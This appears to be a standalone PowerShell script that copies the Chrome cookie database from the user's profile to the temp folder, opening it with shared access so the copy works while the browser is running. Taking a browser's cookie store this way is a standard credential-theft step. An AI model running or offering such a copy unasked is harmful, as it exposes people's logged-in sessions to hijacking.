$src = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default\Network\Cookies'
$dest = Join-Path $env:TEMP 'chrome_cookies.db'

try {
  $fileStream = New-Object System.IO.FileStream($src, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
  $outStream = New-Object System.IO.FileStream($dest, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
  $fileStream.CopyTo($outStream)
  $fileStream.Close()
  $outStream.Close()
  Write-Host "COPIED_OK"
} catch {
  Write-Host "ERROR: $($_.Exception.Message)"
}
